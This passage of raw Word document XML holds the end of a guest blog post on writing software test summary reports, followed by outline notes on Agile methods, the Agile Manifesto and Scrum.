          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="974" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Lessons learned can be explained in detail, which will convey the Responsibility which was taken to solve these issues. Also this will be a reference for upcoming projects to avoid these.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="129"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="975" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="976" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Similarly, mentioning the Best Practices will portray the efforts taken by the team apart from regular testing, which will also be treated as a “Value Addition”.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="129"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="977" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="978" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>Mentioning the Metrics in graphics form (Charts, Graphs) will be a good way to visually represent the status &amp; data.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="129"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="979" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="980" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Remember, Test summary report shall mention and explain the activities performed as part of the Testing, to the recipients to understand better.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="129"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="981" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="982" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Few more appropriate sections can be added if required.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="983" w:author="Unknown"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="000000"/>
          <w:sz w:val="31"/>
          <w:szCs w:val="31"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="984" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="000000"/>
            <w:sz w:val="31"/>
            <w:szCs w:val="31"/>
          </w:rPr>
          <w:t>Conclusion:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="985" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="986" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Test summary report is an important deliverable and focus should be to prepare an effective document, as this artifact will be shared with various stake holders like senior management, client etc.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="987" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="988" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">After performing an exhaustive testing, publishing the test results, metrics, best practices, </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>lessons</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> learnt, conclusions on ‘Go Live’ etc. are extremely important to produce that as an evidence for the Testing performed and the Testing conclusion.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="989" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="990" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>We have also made available the test report sample for download. It is a perfect example of how to prepare an effective test summary report!</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="991" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="992" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>About the author:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> This is a guest post by </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Baskar</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Pillai</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">. He is having around 14 years of experience in Test management and end to end software testing. CSTE certified Testing professional, trainer, worked in IT majors like Cognizant, HCL, </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Capgemini</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> and currently working as Test Manager for a large MNC.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="993" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="994" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Please let us know your Comments/questions/thoughts.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="995" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="996" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Like this article? Please consider sharing it with your friends. After all sharing is caring!</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:r>
        <w:t>What</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00522269" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00522269">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Why</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00522269" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00522269">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Where</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>when</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00522269" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00522269">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>how</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>who</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6C6E">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Agile:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="130"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6C6E">
        <w:t>Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="130"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6C6E">
        <w:t>Agile Project Management</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="130"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6C6E">
        <w:lastRenderedPageBreak/>
        <w:t>What is Scrum?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="130"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6C6E">
        <w:t>Functionality of Scrum</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="130"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6C6E">
        <w:t>Components of Scrum</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="130"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6C6E">
        <w:t>Scrum Roles</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="130"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6C6E">
        <w:t>The Process</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="130"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6C6E">
        <w:t>Scrum Artifacts</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="008D6C6E">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Introduction:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="131"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6C6E">
        <w:t>Classical methods of software development have many disadvantages:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="131"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6C6E">
        <w:t>huge effort during the planning phase</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="131"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6C6E">
        <w:t>poor requirements conversion in a rapid changing environment</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="131"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6C6E">
        <w:t>treatment of staff as a factor of production</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="131"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6C6E">
        <w:t xml:space="preserve">New methods: </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:r w:rsidRPr="008D6C6E">
        <w:tab/>
        <w:t>Agile Software Development</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="008D6C6E">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Manifesto for Agile SD</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="132"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6C6E">
        <w:t>Based on the Manifesto for Agile Software Development</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="132"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6C6E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Individuals and interactions</w:t>
      </w:r>
      <w:r w:rsidRPr="008D6C6E">
        <w:t xml:space="preserve"> over processes and tools </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="132"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6C6E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Working software </w:t>
      </w:r>
      <w:r w:rsidRPr="008D6C6E">
        <w:t xml:space="preserve">over comprehensive documentation </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="132"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6C6E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Customer collaboration </w:t>
      </w:r>
      <w:r w:rsidRPr="008D6C6E">
        <w:t xml:space="preserve">over contract negotiation </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="008D6C6E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="132"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6C6E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Responding to change</w:t>
      </w:r>
      <w:r w:rsidRPr="008D6C6E">
        <w:t xml:space="preserve"> over following a plan </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00036504" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00036504">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Agile Project Management</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00036504" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="133"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00036504">
        <w:t>Qualities:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00036504" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="133"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00036504">
        <w:t xml:space="preserve">Minimize risk </w:t>
      </w:r>
      <w:r w:rsidRPr="00036504">
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r w:rsidRPr="00036504">
        <w:t xml:space="preserve"> short iterations</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00036504" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="133"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00036504">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Real-time communication (prefer face-to-face) </w:t>
      </w:r>
      <w:r w:rsidRPr="00036504">
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r w:rsidRPr="00036504">
        <w:t xml:space="preserve"> very little written documentation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00036504" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="133"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00036504">
        <w:t>Indicated for unpredictable / rapidly changing requirements</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="001631CC" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="001631CC">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Agile Methods</w:t>
      </w:r>
    </w:p>
